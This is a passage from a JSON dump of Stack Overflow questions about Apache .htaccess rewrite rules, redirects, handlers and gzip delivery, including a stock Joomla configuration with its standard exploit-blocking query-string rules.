page.php?id=$1&amp;cat=$2&amp;title=$3 [NC,L]\n</code></pre>\n\n<p>and its work perfectly in my localhost. but not works in server,</p>\n\n<p>the following <strong>.htaccess</strong> works good in my server</p>\n\n<pre><code>RewriteEngine on\nRewriteRule testpage\\.html http://www.google.com [R]\n</code></pre>\n\n<p>did i make any mistake? any help?</p>\n"},{"tags":["regex",".htaccess","http-status-code-403"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12946007,"title":"403 Forbidden error after htaccess redirect [SOLVED]","body":"<p>I have a .htaccess file intended to get images, js and css from the corresponding folders just by getting the file extension. It should always get the files from /img, /js and /css in the root folder.</p>\n\n<p>The lines I have for css and js work fine:</p>\n\n<pre><code>RewriteRule ^(([a-zA-Z0-9\\-\\.\\/]+)/)?([a-zA-Z0-9\\-\\.]+).js$ js/$3.js [NC,L]\nRewriteRule ^(([a-zA-Z0-9\\-\\.\\/]+)/)?([a-zA-Z0-9\\-\\.]+).css$ css/$3.css [NC,L]\n</code></pre>\n\n<p>But when I try to use a similar line for the images I get a 403 \"You don't have permission to access /img/ on this server.\" error:</p>\n\n<pre><code>RewriteRule ^(([a-zA-Z0-9\\-\\.\\/]+)/)?(([a-zA-Z0-9\\-\\.]+).(jpg|png|svg|gif))?$ img/$3 [NC,L]\n</code></pre>\n\n<p>Everything work fine in the home page, but if you try to another page like mydomain.com/contact/ you get the 403 error. Even if you copy and paste the image URL in your browser it opens fine.</p>\n\n<p>I tested the regular expression here: <a href=\"http://www.regextester.com/\" rel=\"nofollow\">http://www.regextester.com/</a> and it's fine. What could be causing the problem?</p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12955796,"title":"expression engine htaccess rewrite that excludes admin.php","body":"<p>I am using Expression Engine and have a rule in my htaccess to rewrite urls so that the index.php portion of the url is removed. However this then stops the admin area working for some reason which uses admin.php to route everything through. This is the contents of my htaccess:</p>\n\n<pre><code>RewriteEngine on \nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>Does anyone know how to prevent this rules being applied to admin.php?</p>\n"},{"tags":["php",".htaccess","addhandler"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":12955741,"title":"htaccess AddHandler ***x-httpd-php5x*** and ***application/x-httpd-php5x***","body":"<p>What is the difference between <code>x-httpd-php5x</code> and <code>application/x-httpd-php5x</code></p>\n\n<p>I'v been using <code>application/x-httpd-php</code> for years with my web hosting (<strong>Linux</strong>) until they upgrade PHP to version>=5.2. Now I have to use <code>x-httpd-php5x</code> on web hosting which does not work on localhost (<strong>Windows</strong>).</p>\n\n<p>So everytime I made some changes to the .htaccess, I have to change the AddHandler as well while uploading to web hosting.</p>\n\n<p>Is there a cross-platform <code>AddHandler</code> to parse files as PHP?</p>\n\n<h1>edit</h1>\n\n<p>.php can always work, with/without specifing in .htaccess. but not custom extesions, e.g. .myphp</p>\n"}]}
{"total":14527,"page":8,"pagesize":100,"questions":[{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12955596,"title":"URL directory as variable with htaccess","body":"<p>my actual .htaccess is</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([_0-9a-zA-Z-]+)? index.php?cl=$1 [L]\n</code></pre>\n\n<p>and it works good when i type something like sub.domain.com/client1 (then i get the $cl variable in my php code properly). Problem is when i add a final trailing slash like sub.domain.com/client1/ then i get \"client1/\" in my var! </p>\n\n<p>How can i fix it? I know that the second condition in my htaccess looks for existing directories and skips the rewrite rule but there is no \"client1\" dir on my server!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12952463,"title":"htaccess conditional rewrites","body":"<p>Im using an MVC framework for my PHP application which works great.  I have the below code in a .htaccess file in the root folder of my application.  This redirects everything to the public folder which is causing issues for me.  I want to apply the below to everyfolder apart from one.  How would I go about doing this?  ie.  need to access the /dompdf/ directory and all subdirectories normally wihtout the below rule which redirects.</p>\n\n<pre><code>#&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteRule    ^$    public/    [L]\n    RewriteRule    (.*) public/$1    [L]\n# &lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12951629,"title":"oxwall .htaccess","body":"<p>This is my .htaccess file</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\n\nAddEncoding gzip .gz\nAddEncoding gzip .gzip\n&lt;FilesMatch \"\\.(js.gz|js.gzip)$\"&gt;\n  ForceType text/javascript\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.(css.gz|css.gzip)$\"&gt;\n  ForceType text/css\n&lt;/FilesMatch&gt;\n\nRewriteCond %{REQUEST_URI} .*/http-bind\nRewriteRule (.*) /http-bind [L]\n\nRewriteCond %{REQUEST_URI} !^/index\\.php\nRewriteCond %{REQUEST_URI} !/ow_updates/index\\.php\nRewriteCond %{REQUEST_URI} !/ow_updates/\nRewriteCond %{REQUEST_URI} !/ow_cron/run\\.php\nRewriteCond %{REQUEST_URI} (/|\\.php|\\.html|\\.htm|\\.xml|\\.feed|robots\\.txt|\\.raw|/[^.]*)$  [NC]\nRewriteRule (.*) index.php\n</code></pre>\n\n<p>Oxwall version 1.4.1. When I browse to localhost it's redirect me to localhost/install/requirements/ with message - The requested URL /install/requirements was not found on this server. \nWhen I browse to localhost/index.php installation start but after installation the oxwall doesn't work properly.</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":12951531,"title":"Redirect users according to country -HTACCESS?","body":"<p>. Consider my domain name is www.example.com . It is in english</p>\n\n<p>And i have have one language version for dutch   www.example.com/nl</p>\n\n<p>I want to redirect url to www.example.com/nl only for people requesting from Netherland.</p>\n\n<p>My website is in shared hosting.  How can i achieve this ?</p>\n"},{"tags":["wordpress",".htaccess","cakephp","mod-rewrite","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12947396,"title":"Set up CakePHP in a subdirectory; Wordpress is installed in the root","body":"<p>I have been searching for a solution for 2 hours but nothing seems to work... here is my problem:</p>\n\n<p>I have WordPress installed in the root (var/www).  So by going to <a href=\"http://www.geekderek.com\" rel=\"nofollow\">http://www.geekderek.com</a>, I see my wordpress site.</p>\n\n<p>I put CakePHP in a subdirectory var/www/cakephp.  I want to be able to see my CakePHP app by going to: www.geekderek.com/cakephp.</p>\n\n<p>However, currently this url just returns a Wordpress page saying \"Content not found.\"</p>\n\n<p>I believe this problem can be solved by modifying .htaccess in my root directory.  So here is my .htaccess: <a href=\"http://pastebin.com/sXJTRstB\" rel=\"nofollow\">http://pastebin.com/sXJTRstB</a></p>\n\n<p>As you can see, I added this line to the default WP .htaccess file:</p>\n\n<pre><code>RewriteRule    ^cakephp(/(.*))?$ cakephp/app/webroot/$1    [QSA,L]\n</code></pre>\n\n<p>However, for some reason this doesn't seem to work.</p>\n\n<p>Could anyone please tell me what is wrong??  Thank you so much!</p>\n"},{"tags":[".htaccess","zend-framework","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12949100,"title":"RewriteRule for sitemaps in Zend Framework","body":"<p>I have the following .htaccess rules: </p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^sitemap_(.*)\\.xml$ /xml/sitemap/$1 #[L]\n\nRewriteRule ^.*$ /index.php [NC,L]\n</code></pre>\n\n<p>Unfortunately I can not use internal Zend Framework routing for processing sitemaps, but the rules above do not work. </p>\n\n<p>Sitemap URLs look like:</p>\n\n<pre><code>/sitemap_index.xml\n/sitemap_pages.xml\n/sitemap_news.xml\n</code></pre>\n\n<p>Required rewrite works fine in cases I set it R=301 redirect or comment out the last rule. Both of these are not options. Can anyone help please?</p>\n"},{"tags":[".htaccess","routing","controller","cakephp-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12922929,"title":"CakePHP routing exception in .htaccess file still results in missing controller error","body":"<p>I have a CakePHP 2 install but have certain URLs exempt from the default routing. I did this by adding the exception to the .htaccess file. So for example the call the <a href=\"http://www.mydomain.com/blog\" rel=\"nofollow\">http://www.mydomain.com/blog</a> or <a href=\"http://www.mydomain.com/proofgallery\" rel=\"nofollow\">http://www.mydomain.com/proofgallery</a> both redirected to a folder outside of the cakephp. </p>\n\n<p>The .htaccess code looks like this:</p>\n\n<pre><code># Overrides to the cake routing    \n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\nRewriteCond %{REQUEST_URI} ^/?  (blog|proofgallery)/(.*)$\n  RewriteRule ^.*$ - [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>However, I noticed in the error.log that something causes a missing controller error for those exemptions.</p>\n\n<p>E.g.</p>\n\n<pre><code>2012-10-16 14:49:15 Error: [MissingControllerException] Controller class ProofgalleryController could not be found.\n#0 /home/mydomain/public_html/app/webroot/index.php(96): Dispatcher-&gt;dispatch(Object(CakeRequest), Object(CakeResponse))\n#1 {main}\n\n2012-10-16 11:13:24 Error: [MissingControllerException] Controller class BlogController could not be found.\n#0 /home/mydomain/public_html/app/webroot/index.php(96): Dispatcher-&gt;dispatch(Object(CakeRequest), Object(CakeResponse))\n</code></pre>\n\n<p>#1 {main}</p>\n\n<p>Why is that? And how to avoid it? As far as I can tell, all links from within the application use the full URL (http://www.mbvphotography.com/blog) and not the Cake HTML helper, which might explain the missing controller error. </p>\n"},{"tags":[".htaccess","drupal-6"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12949007,"title":"Why isn't the user with id #1 able to edit the user details?","body":"<p>I have one site in Drupal 6. When I log in as user #1, and I visit the page at user/[uid]/edit, I am not able to access this page. I get an access denied error.</p>\n\n<p>Can any one please tell me what may be the problem, and the solution?</p>\n"},{"tags":[".htaccess","routes","opencart"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12934960,"title":"Opencart normal urls don't work anymore","body":"<p>I'm facing a problem with Opencart where only the SEO urls are working and all the 'normal' urls like \n<strong>index.php?route=common/home</strong>\netc have stopped working. They lead to a page not found error.</p>\n\n<p>This is my site : <a href=\"http://www.24x7style.com\" rel=\"nofollow\">www.24x7style.com</a></p>\n\n<p>I haven't made any changes to my site recently..What could be the problem here? </p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12947941,"title":".htaccess redirect files ending with / or index.html to .shtml","body":"<p>After transferring my site to a new CMS which has a new file structure and file extension, I need to redirect all files ending with / or index.html to .shtml:</p>\n\n<p>example.com/violent-crimes/assault-with-a-deadly-weapon/<br/>\nto<br/>\nexample.com/violent-crimes/assault-with-a-deadly-weapon.shtml</p>\n\n<p>example.com/violent-crimes/assault-with-a-deadly-weapon/index.html <br/>\nto<br/>\nexample.com/violent-crimes/assault-with-a-deadly-weapon.shtml</p>\n\n<p>example.com/violent-crimes/index.html <br/>\nto<br/>\nexample.com/violent-crimes.shtml</p>\n\n<p>example.com/violent-crimes/ <br/>to<br/>\nexample.com/violent-crimes.shtml</p>\n"},{"tags":["regex",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12947482,"title":"htacess redirect all pages to www except checkout page","body":"<p>I have a website with ssl which works on only the non www version. Is it possible to redirect all url to www version except the checkout page using htacess and to add the https:// on the checkout page</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12947230,"title":"htacess redirect if url stops with specific word","body":"<p>Is it possible to redirect based on an url that would be as:</p>\n\n<p>www.url.com/stuff.php</p>\n\n<p>But not redirect if the url contained any characters after the php, as such:</p>\n\n<p>www.url.com/stuff.php?variables=values&amp;othervariable=othervalue&amp;etc=more</p>\n\n<p>I have no clue how to wriite this either.</p>\n\n<p>Thanks in advance!</p>\n\n<p>Edit: basically I need the redirect to happen to www.url2.com only if www.url.com ends with .php, but not if the .php is followed by variables.</p>\n"},{"tags":["javascript","html",".htaccess","gzip"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12943588,"title":"Gziped Css and JS not working","body":"<p>I can't get my gziped css and js files to work. They are compressed but when I open the link to them I get something like this as result:</p>\n\n<pre><code>    ‹������Í½{Û6²0üÿ~\n››#“,KNÛm©0ÞÄI¶=ÛÛi²·WVúP$%Ñ–DY_\"i?û;\\IÊv»çý=owc‘ 0�ƒÁ`03¸‰Å\"ý=ž¬³ÈóÄ8^žOòä*K£a&lt;Yfb™Å‹dü]ÍÖ“É†ëY²Ê‹ÙA2ôôÍ/—ÁFçƒ·Vžvó¡h€Sf¸Á§®UÙj±ÎvXH\"]$0‰ž§2Åiúî&amp;›­¾Ï—«l–- ŠšTÿh0Y/ŽÄ0ŸL¸¹‚útës§ƒI‚M:‹l™­Ü\"‹lµ^Ì¨­¤¨¦¬Vq2&amp;HÁæPÊ¡íQé³TÌÊ\n„Î~Z—¿¶Iº1ºl£aÀpëâI¶�?þtðîïï~üxðúãÇ×çßþ�‡‡‡Gung†Ö´Ì6ÐÃ´HÖShKk”­ÞM2||sÿ]ê«Ôxy^°yjf=¶Ý2Åí¬¦XöŸÛóvÝ?ø\n\\óeë‡¢øX“e´¹ÉKøzÖOÖù$\n½øE–¥_}sš¦_Ùþ²~Ýî|õu–œ&amp;j\n³oÚÁàOéàÀÆÎ\"ººŸg?\n#\n</code></pre>\n\n<p>Any ideas why this is happening and how I should resolve this?</p>\n\n<p>Apache modules like deflate,expires,headers are all installed and working. </p>\n\n<p>The platform I'm using is typo3. </p>\n\n<p>Thanks.</p>\n\n<pre><code>    &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"all\" href=\"typo3temp/scriptmerger/compressed/head-ed0db5492e25e2aae2d5194f2417f7f4.merged.gz.css\" /&gt;\n\n    &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"typo3temp/scriptmerger/compressed/head-51cb0e8880d742a31d3b7277d848f046.merged.gz.css\" /&gt;\n\n&lt;!--[if lt IE 7]&gt;\n&lt;![endif]--&gt;\n    &lt;script type=\"text/javascript\" src=\"typo3temp/scriptmerger/compressed/head-fd881451a9d72dbe96f8afc7214bf265.merged.gz.js\"&gt;&lt;/script&gt;\n</code></pre>\n"},{"tags":[".htaccess","redirect","pattern-matching","bulk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12947350,"title":"301 redirect to remove trailing hyphen","body":"<p>I have hundreds of duplicate pages due to a trailing - (hyphen) at the end of urls.</p>\n\n<p>Now I can redirect each one separately and it works, but I'm looking for a bulk/pattern match redirect which will redirect these to save a lot of work.</p>\n\n<p><a href=\"http://example.co.uk/example/example-\" rel=\"nofollow\">http://example.co.uk/example/example-</a>   301 redirect too  <a href=\"http://example.co.uk/example/example\" rel=\"nofollow\">http://example.co.uk/example/example</a></p>\n\n<p>I've tried to create one with query string redirects that I know work for questions marks, but   I'm having no luck.</p>\n\n<p>Thanks,</p>\n"},{"tags":["apache",".htaccess","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12944774,"title":"Howto use <directory> directive within htacess","body":"<p>I have wrote this lines in my .htacess file:  </p>\n\n<pre><code>&lt;Directory /img&gt;\nHeader set Cache-Control \"max-age=604800, public\"\n&lt;/Directory&gt;\n</code></pre>\n\n<p>But the server encountered an 500 Internal Server Error.<br>\nI really want to apply that rule to few directories (like: img/ js/ icons/ ),<br>\nbut not to all of the image files in the site.  </p>\n\n<p>The question:<br>\nWhat is the right way to apply a rule to whole directory ?<br>\nIs it possible by single htacess file, without htacess file in each directory ?</p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":11311053,"title":"RewriteRule to remove %2f in query string","body":"<p>i have a bunch of miss-generated URLs, which i would like to redirected to the correct URL.</p>\n\n<p>This is a good example:</p>\n\n<pre><code>http://example.com/search/?q=searchterm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F&amp;scope=45%2F%2F%2F%2F%2F/\n</code></pre>\n\n<p>I already could redirect most of them with the following rule:</p>\n\n<pre>\n\n    RewriteCond %{QUERY_STRING} ^(.*)%2F\n    RewriteRule ^search/$ /search/?%1 [NE,R=301,L]\n\n</pre>\n\n<p>As i understand, this only works because the trailing \"%2F\" is removed and then the rule hits again. Google only accepts a limited number of redirects.</p>\n\n<p>So i try to adapt the rule to work with 1 or more occurrences of \"%2f\"</p>\n\n<p>This is how far i got:</p>\n\n<pre>\n\n    RewriteCond %{QUERY_STRING} ^(.*)((%2F)*)\n    RewriteRule ^search/$ /search/?%1 [NE,R=301,L]\n\n</pre>\n\n<p>The results are:\n/search/?q=searchtermFFFFFFFFFFFFFFFF&amp;scope=45FFFFF/ </p>\n\n<p>What am i missing?</p>\n\n<p>Best regards,\nAlexander</p>\n"},{"tags":["apache",".htaccess","vtiger"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":11372991,"title":"Installing vTigercrm - why URL not found?","body":"<p>I am trying to install vTigercrm-5.4.0.tar.gz file via ftp path..\nand I am following the following <a href=\"http://www.tmdhosting.com/tutorials/vtiger/vtiger-installation.html\" rel=\"nofollow\">tutorial</a></p>\n\n<p>I uploaded the source file. extracted it to http:///admin</p>\n\n<p>now, when I try to access </p>\n\n<pre><code>&gt; http://mydomain.com/admin\n</code></pre>\n\n<p>or </p>\n\n<blockquote>\n  <p><code>http://mydomain/admin/install.php</code></p>\n</blockquote>\n\n<p>I get the following error, </p>\n\n<blockquote>\n  <p>The requested URL /admin/ was not found on this server.</p>\n  \n  <p>Additionally, a 404 Not Found error was encountered while trying to\n  use an ErrorDocument to handle the request.</p>\n</blockquote>\n\n<p>I googled so much about the issue, but I am at failure in resolving it, vtiger forums is not helping also regarding this issue,, \nCan somebodey tell me why this is happening?</p>\n\n<p>what is possible solution?</p>\n\n<p>Should I have to introduce .httaccess or something else?</p>\n\n<p>I am striking my head for last 10 hours, still at failure, please somebody help me</p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12944950,"title":"redirect any subdomain to a folder of the same subdomain","body":"<p>I need to create a conditional redirect and rewrite for apache that accomplishes the following</p>\n\n<ol>\n<li><p>redirect any subdomain to a folder of the same subdomain ie</p>\n\n<ul>\n<li>subdomain.domain.com redirects to subdomain.domain.com/store</li>\n<li>subdomain2.domain.com redirect to subdomain2.domain.com/store</li>\n</ul></li>\n<li><p>all subdomains with www. would do the same thing except remove the www ie</p>\n\n<ul>\n<li>www.subdomain.domain.com redirects to subdomain.domain.com/store</li>\n<li>www.subdomain2.domain.com redirect to subdomain2.domain.com/store</li>\n</ul></li>\n<li><p>the main domain does not redirect but the domain with www. is rewritten to without the www ie</p>\n\n<ul>\n<li>domain.com does not redirect or change</li>\n<li>www.domain.com rewrites to domain.com</li>\n</ul></li>\n<li><p>all options should work for http and https, ie http remains http and https remains https after any redirection or rewrite</p></li>\n</ol>\n\n<p>Note: all subdomains points to the same main web folder.</p>\n\n<p>What i have so far</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^domain\\.com$ [NC]\nRewriteRule ^/?$ \"http\\:\\/\\/www\\.domain\\.com\\/\" [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^subdomain\\.domain\\.com [NC]\nRewriteRule ^(.*)$ http://www\\.domain\\.com/store/$1 [L]\n</code></pre>\n"},{"tags":[".htaccess","https","joomla2.5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":41,"score":-4,"question_id":12944476,"title":"https (for one page) is not working when Joomla htaccess is activated","body":"<p>I search for hours here and in the web. I have joomla 2.5 installation and I need two pages (not folders) to be with https.\nIt is working fine until I actived the Joomla standard .htaccess. Then all URLs are shown like www.mydomain.com/testpage\nbut with my <a href=\"https://www.mydomain.com/documents\" rel=\"nofollow\">https://www.mydomain.com/documents</a> I get an error:\n\"Not Found\nThe requested URL /documents was not found on this server.\"\nIt works with only http but not with https.\nI need: <a href=\"https://www.mydomain.com/documents\" rel=\"nofollow\">https://www.mydomain.com/documents</a> (documents is not a real folder but a menu item)</p>\n\n<p>could you tell me what code to add to my .htaccess? I tried about 10 different versions...\nThanks!!!</p>\n\n<p>here is my .htacces (Joomla Standard)</p>\n\n<pre><code>##\n# @package      Joomla\n# @copyright    Copyright (C) 2005 - 2012 Open Source Matters. All rights reserved.\n# @license      GNU General Public License version 2 or later; see LICENSE.txt\n##\n\n##\n# READ THIS COMPLETELY IF YOU CHOOSE TO USE THIS FILE!\n#\n# The line just below this section: 'Options +FollowSymLinks' may cause problems\n# with some server configurations.  It is required for use of mod_rewrite, but may already\n# be set by your server administrator in a way that dissallows changing it in\n# your .htaccess file.  If using it causes your server to error out, comment it out (add # to\n# beginning of line), reload your site in your browser and test your sef url's.  If they work,\n# it has been set by your server administrator and you do not need it set here.\n##\n\n## Can be commented out if causes errors, see notes above.\nOptions +FollowSymLinks\n\n## Mod_rewrite in use.\n\nRewriteEngine On\n\n## Begin - Rewrite rules to block out some common exploits.\n# If you experience problems on your site block out the operations listed below\n# This attempts to block the most common type of exploit `attempts` to Joomla!\n#\n# Block out any script trying to base64_encode data within the URL.\nRewriteCond %{QUERY_STRING} base64_encode[^(]*\\([^)]*\\) [OR]\n# Block out any script that includes a &lt;script&gt; tag in URL.\nRewriteCond %{QUERY_STRING} (&lt;|%3C)([^s]*s)+cript.*(&gt;|%3E) [NC,OR]\n# Block out any script trying to set a PHP GLOBALS variable via URL.\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\n# Block out any script trying to modify a _REQUEST variable via URL.\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\n# Return 403 Forbidden header and show the content of the root homepage\nRewriteRule .* index.php [F]\n#\n## End - Rewrite rules to block out some common exploits.\n\n## Begin - Custom redirects\n#\n# If you need to redirect some pages, or set a canonical non-www to\n# www redirect (or vice versa), place that code here. Ensure those\n# redirects use the correct RewriteRule syntax and the [R=301,L] flags.\n#\n## End - Custom redirects\n\n##\n# Uncomment following line if your webserver's URL\n# is not directly related to physical file paths.\n# Update Your Joomla! Directory (just / for root).\n##\n\n# RewriteBase /\n\n## Begin - Joomla! core SEF Section.\n#\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n#\n# If the requested path and file is not /index.php and the request\n# has not already been internally rewritten to the index.php script\nRewriteCond %{REQUEST_URI} !^/index\\.php\n# and the request is for something within the component folder,\n# or for the site root, or for an extensionless URL, or the\n# requested URL ends with one of the listed extensions\nRewriteCond %{REQUEST_URI} /component/|(/[^.]*|\\.(php|html?|feed|pdf|vcf|raw))$ [NC]\n# and the requested path and file doesn't directly match a physical file\nRewriteCond %{REQUEST_FILENAME} !-f\n# and the requested path and file doesn't directly match a physical folder\nRewriteCond %{REQUEST_FILENAME} !-d\n# internally rewrite the request to the index.php script\nRewriteRule .* index.php [L]\n#\n## End - Joomla! core SEF Section.\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12944286,"title":".htaccess work with and without trailing slash","body":"<p>Using .htaccess, how can I get my website to be able to do this. Here is what I have already.</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteRule ^(.*)/(.*)$ sites/index.php?url=$1&amp;page=$2\n</code></pre>\n\n<p>From this, I am able to be able to browse to: \n<a href=\"http://domain.com/sites/example/\" rel=\"nofollow\">http://domain.com/sites/example/</a> \nand that works totally fine. \nWhat I want to be able to do is browse to \n<a href=\"http://domain.com/sites/example\" rel=\"nofollow\">http://domain.com/sites/example</a> \nwith no trailing slash, but it always gives back an error with page not found.</p>\n\n<p>So far from Google, all of the results have failed me.</p>\n\n<p>Thank you.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12944208,"title":".htaccess - If/Else redirect depending on query string","body":"<p>Setting up an .htaccess seems to be difficult for this situation. For a dating site we have this scenario:</p>\n\n<pre><code>We assume john is logged in:\n\ndomain.com/john //this works no problem\n\ndomain.com/?askout=yes&amp;when=later //this doesn't work, if john is logged in and pastes \n                                    this url, it automatically redirects to domain.com/john\n                                    instead, htaccess should see the ? and know it's\n                                    not a valid user. It should keep the entire query,\n                                    and redirect to /profiles.php?askout=yes&amp;when=later\n</code></pre>\n\n<p>Here is the .htaccess:</p>\n\n<pre><code>RewriteRule ^(\\w+)/?$ ./profiles.php?username=$1\n</code></pre>\n\n<p>Basically, I need to have .htaccess know that an immediate ? means not to use the above rewrite rule. Any idea how to accomplish this?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12943857,"title":"htaccess simple rewrite (theoretically)","body":"<p>Been racking my head on this for awhile:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule ^(.*)\\.(json|xml|printr)$ /endpoint.php?request=$1&amp;type=$2\n</code></pre>\n\n<p>Should let me do <code>http://d.com/v1/helloworld.json</code> and translate it to <code>http://d.com/endpoint.php?request=/v1/helloworld&amp;type=json</code> but all I am seeing is an error 404.</p>\n\n<p>I've verified in Apache that AllowOveride All is on.</p>\n"},{"tags":[".htaccess","seo","noindex"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12942902,"title":"How to write a htaccess rule specific for a given subdomain? - Avoiding indexing some files","body":"<p>I have the following on my .htaccess file:</p>\n\n<pre><code>Options +FollowSymlinks\n#+FollowSymLinks must be enabled for any rules to work, this is a security \n#requirement of the rewrite engine. Normally it's enabled in the root and we \n#shouldn't have to add it, but it doesn't hurt to do so.\n\nRewriteEngine on\n#Apache scans all incoming URL requests, checks for matches in our #.htaccess file \n#and rewrites those matching URLs to whatever we specify.\n\n#allow blank referrers.\nRewriteCond %{HTTP_REFERER} !^$\nRewriteCond %{HTTP_REFERER} !^http(s)?://(www\\.)?site.com [NC]\nRewriteCond %{HTTP_REFERER} !^http(s)?://(www\\.)?site.dev [NC]\nRewriteCond %{HTTP_REFERER} !^http(s)?://(www\\.)?dev.site.com [NC]\nRewriteRule \\.(jpg|jpeg|png|gif)$ - [NC,F,L]\n\n# if a directory or a file exists, use it directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\n\n# otherwise forward it to index.php\nRewriteRule . index.php\n</code></pre>\n\n<p>site.com is the production site.</p>\n\n<p>site.dev is a localhost dev environment.</p>\n\n<p>dev.site.com is a subdomain where we test live.</p>\n\n<p>I'm aware that this will avoid the site to be indexed:</p>\n\n<pre><code>Header set X-Robots-Tag \"noindex, nofollow\"\n</code></pre>\n\n<p><em>cf</em>. <a href=\"http://yoast.com/prevent-site-being-indexed/\" rel=\"nofollow\">http://yoast.com/prevent-site-being-indexed/</a></p>\n\n<p>My question is however, fairly simple perhaps:</p>\n\n<p>Is there a way to apply this line ONLY on dev.site.com, so that it doesn't get indexed ?</p>\n"},{"tags":["apache",".htaccess","rewrite","httpd.conf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":426,"score":0,"question_id":11901993,"title":"Options FollowSymLinks or SymLinksIfOwnerMatch is off","body":"<p>I've read almost everything possible for this issue and couldn't find anything that would solve my problem.\nThis is erorr log I'm getting:\nOptions FollowSymLinks or SymLinksIfOwnerMatch is off which implies that RewriteRule directive is forbidden: /var/www/vhosts/site.com/httpdocs/cgi-bin/cron.pl </p>\n\n<p>When accessing site I get 403 Forbidden \"You do not have permission to access this document.\" error.</p>\n\n<p>I've modified my .htaccess to have this:</p>\n\n<pre><code>Options +FollowSymLinks +SymLinksIfOwnerMatch\nAddDefaultCharset utf-8\nRewriteEngine on\nRewriteCond %{HTTP:Authorization} ^(.*)\nRewriteRule ^(.*) - [E=HTTP_CGI_AUTHORIZATION:%1]\n.\n.\n.\n</code></pre>\n\n<p>I also added this to httpd.conf:</p>\n\n<pre><code>AddHandler cgi-script .cgi\nAddHandler cgi-script .pl\n\n&lt;Directory 